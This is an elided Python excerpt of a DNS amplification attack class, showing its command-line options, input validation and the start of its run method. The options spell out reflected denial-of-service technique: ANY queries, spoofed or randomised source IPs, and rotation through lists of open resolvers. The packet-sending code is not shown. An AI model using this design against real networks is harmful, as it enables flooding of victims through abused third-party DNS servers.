...
class DnsAmplification(AttackBase):
    ...
    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        ...
        dns_group.add_argument(
            "--dns-server", required=True, help="DNS server to use for amplification"
        )
        dns_group.add_argument("--dns-port", type=int, default=53, help="DNS server port")
        dns_group.add_argument(
            "--dns-servers-file", help="File containing list of DNS servers (one per line)"
        )
        dns_group.add_argument("--query-domain", required=True, help="Domain to query")
        dns_group.add_argument(
            "--query-type", default="ANY", help="DNS query type (e.g., ANY, A, AAAA, TXT)"
        )
        ...
        net_group.add_argument(
            "--source-ip", help="Source IP address for packets (random if not specified)"
        )
        net_group.add_argument(
            "--source-port", type=int, help="Source port for packets (random if not specified)"
        )
        net_group.add_argument(
            "--randomize-source", action="store_true", help="Randomize source IP for each packet"
        )
        ...
        behavior_group.add_argument(
            "--interval", type=float, default=0.1, help="Time interval between packets (seconds)"
        )
        behavior_group.add_argument(
        ...
        behavior_group.add_argument(
            "--rotate-dns",
            action="store_true",
            help="Rotate through DNS servers if multiple provided",
        )
        behavior_group.add_argument(
        ...
        monitor_group.add_argument(
            "--stats-interval", type=float, default=1.0, help="Interval for printing statistics"
        )
        monitor_group.add_argument(
        ...
        monitor_group.add_argument(
            "--silent", action="store_true", help="Suppress non-error output"
        )
    ...
    def validate(self, args: argparse.Namespace) -> bool:
        ...
        if args.dns_servers_file:
            if not self.validator.validate_file_path(args.dns_servers_file, check_readable=True):
                ...
                return False
            try:
                with open(args.dns_servers_file) as f:
        ...
        if args.query_type.upper() not in valid_query_types:
            logger.error(
                f"Invalid query type: {args.query_type}. Must be one of {valid_query_types}"
            )
            return False
        ...
        if args.packet_log and not self.validator.validate_file_path(
            args.packet_log, check_exists=False, check_readable=False
        ):
    ...
    def run(self, args: argparse.Namespace) -> None:
        ...
        try:
            ...
            # Run the attack
            logger.info(
                f"Running DNS amplification attack against {args.target} using {args.dns_server}"
            )
